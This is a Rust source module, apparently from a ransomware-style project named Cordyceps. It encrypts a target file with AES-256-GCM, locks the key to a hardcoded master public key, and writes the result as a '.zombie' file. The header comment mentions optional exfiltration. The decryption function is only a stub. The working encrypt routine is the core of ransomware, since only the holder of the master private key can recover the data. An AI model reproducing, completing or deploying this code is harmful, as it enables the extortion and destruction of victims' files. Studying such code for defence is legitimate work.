//! Cryptographic operations for file encryption and decryption.
//!
//! This module contains the core logic for encrypting and decrypting files,
//! as used by the CLI interface. It defines the encryption and decryption
//! routines, and is responsible for handling cryptographic workflows,
//! such as file processing, key usage, and optional exfiltration.

use std::fs::File;
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

use aes_gcm::{
    Aes256Gcm,
    aead::{Aead, KeyInit, Nonce},
};
use hkdf::Hkdf;
use log::{debug, info, trace};
use rand::{RngCore, rngs::OsRng};
use x25519_dalek::{EphemeralSecret, PublicKey};

use crate::error::CryptoError;

/// Encrypted files extension.
pub const EXTENSION: &'static str = "zombie";

/// Magic bytes to identify Cordyceps encrypted files
const MAGIC_BYTES: &[u8; 4] = b"CORD";
/// .zombie file format version
const FILE_FORMAT_VERSION: u8 = 0x01;

/// Master public key used by the encryptor to encapsulate the AES key
const MASTER_PUBLIC_KEY_BYTES: [u8; 32] = [
    0x8e, 0x1f, 0x5a, 0x2b, 0x9c, 0x7e, 0x4d, 0x3f, 0x6a, 0x81, 0x05, 0x3d, 0x2c, 0x1a, 0x9b, 0x0f,
    0x7e, 0x6d, 0x3a, 0x1b, 0x9f, 0x0c, 0x8e, 0x1d, 0x5b, 0x2a, 0x9d, 0x7c, 0x4e, 0x3d, 0x6b, 0x82,
];

/// Encrypts a file using AES-GCM for content and ECIES-like key encapsulation
/// for the AES key using Curve25519--x25519-dalek.
///
/// The encrypted file will have a `.zombie` extension and its header will
/// include:
/// - Magic bytes--`CORD`
/// - File format version
/// - Ephemeral public key--generated during encryption
/// - Encrypted AES key + tag--encrypted with AES-GCM with a derived key from
///   ECDH
/// - AES-GCM nonce for key encapsulation
/// - AES-GCM nonce for file content encryption
/// Note: AES-GCM tags are concatenated with their respective ciphertexts
/// by aes_gcm.
///
/// # Arguments
/// - `path`: The path of the file to be encrypted.
///
/// # Returns
/// A `Result` containing the path to the newly created `.zombie` file on
/// success, or a `CryptoError` if encryption fails.
pub fn encrypt(path: &Path) -> Result<PathBuf, CryptoError> {
    info!("Starting encryption for file: {:?}", path);

    // 1. Read file content
    let mut file = std::fs::File::open(path)?;
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)?; // TODO: read file by chunks
    debug!("Read {} bytes from {:?}", plaintext.len(), path);

    // 2. Generate random AES-GCM key and nonce for file content encryption
    let mut file_aes_key_bytes = [0u8; 32]; // 32-byte long AES key
    OsRng.try_fill_bytes(&mut file_aes_key_bytes)?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);

    let mut file_aes_nonce_bytes = [0u8; 12]; // 12-byte long nonce
    OsRng.try_fill_bytes(&mut file_aes_nonce_bytes)?;
    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
    trace!("Generated AES-GCM key and nonce for file content");

    // 3. Encrypt file content with AES-GCM
    let ciphertext_with_tag = cipher_file_aes_gcm
        .encrypt(file_aes_nonce, plaintext.as_ref())
        // map_err is the most effective way to convert error types here
        // because aes_gcm::aead::Error does NOT implement the trait
        // std::error::Error needed by thiserror in error.rs.
        // error handling in Rust is sometimes VERY frustrating.
        .map_err(|e| {
            CryptoError::SymmetricEncryptError(format!(
                "AES-GCM file content encryption failed: {:?}",
                e
            ))
        })?;
    debug!(
        "File content encrypted. Combined ciphertext+tag size: {}",
        ciphertext_with_tag.len()
    );

    // 4. ECIES-like key encapsulation for the AES-GCM key
    let ephemeral_secret = EphemeralSecret::random_from_rng(OsRng);
    let ephemeral_public = PublicKey::from(&ephemeral_secret);
    debug!("Generated ephemeral Curve25519 key pair");

    let master_public_key = PublicKey::from(MASTER_PUBLIC_KEY_BYTES);
    debug!("Master public key loaded");

    let shared_secret = ephemeral_secret.diffie_hellman(&master_public_key);
    debug!("Derived shared secret using ECDH");

    // Use HKDF to derive an AES-GCM key for encrypting the file_aes_key
    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);

    let mut key_enc_aes_nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut key_enc_aes_nonce_bytes);
    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);
    debug!("Derived AES-GCM key and nonce for key encapsulation");

    // Encrypt the file_aes_key_bytes with the derived AES-GCM key
    let encrypted_file_aes_key_with_tag = cipher_key_enc_aes_gcm
        .encrypt(key_enc_aes_nonce, file_aes_key_bytes.as_ref())
        .map_err(|e| {
            CryptoError::SymmetricEncryptError(format!(
                "AES-GCM encryption of file AES key failed: {:?}",
                e
            ))
        })?;
    debug!("File AES key encrypted with AES-GCM");

    // 5. .zombie file creation and opening for writing
    let mut zombie_path = path.to_path_buf();
    let original_file_name = zombie_path.file_name().ok_or_else(|| {
        CryptoError::Io(io::Error::new(
            io::ErrorKind::InvalidInput,
            "Invalid file name for encryption",
        ))
    })?;
    let mut new_file_name = original_file_name.to_os_string();
    new_file_name.push(".");
    new_file_name.push(EXTENSION);
    zombie_path.set_file_name(new_file_name);
    info!("Creating encrypted file: {:?}", zombie_path);
    let mut output_file = File::create(&zombie_path)?;

    // 6. Write the header to the .zombie file
    // .zombie header size in bytes:
    // - Magic.......................: 04
    // - Version.....................: 01
    // - Ephemeral PK................: 32
    // - Encrypted AES key (with tag): 48 (32 + 16)
    // - File content AES-GCM nonce..: 12
    output_file.write_all(MAGIC_BYTES)?;
    output_file.write_all(&[FILE_FORMAT_VERSION])?;
    output_file.write_all(ephemeral_public.as_bytes())?;
    output_file.write_all(&encrypted_file_aes_key_with_tag)?;
    output_file.write_all(key_enc_aes_nonce.as_slice())?;
    output_file.write_all(file_aes_nonce.as_slice())?;
    debug!("Wrote encrypted file header");

    // 7. Write the content ciphertext (with tag)
    output_file.write_all(&ciphertext_with_tag)?;
    debug!("File content written to encrypted file");

    Ok(zombie_path)
}

/// Decrypts a `.zombie` file.
/// Requires the corresponding private key to the master public key used
/// during encryption.
///
/// The function reads the header from the `.zombie` file to extract:
/// - Ephemeral public key
/// - Encrypted AES key + tag (file content)
/// - AES-GCM nonce for key encapsulation
/// - AES-GCM nonce for file content encryption
/// Note: AES-GCM tags are concatenated with their respective ciphertexts
/// by aes_gcm.
///
/// # Arguments:
/// - `path`: A reference to the path of the `.zombie` file to be decrypted
/// - `key`: A reference to the path of the master PRIVATE key file
///
/// # Returns
/// A `Result` containing the path to the newly created decrypted file on
/// success, or a `CryptoError` if decryption fails.
pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
    info!("Starting decryption for file: {:?}", path);

    // 1. Read the master private key
    // 2. Read the .zombie file header
    // 3. Parse header
    // 4. ECIES-like decapsulation for the file AES key (with AES-GCM)
    // 5. Decrypt file content with AES-GCM
    // 6. Construct the decrypted file path
    // 7. Write decrypted content to the new file
    Ok(path.to_path_buf())
}
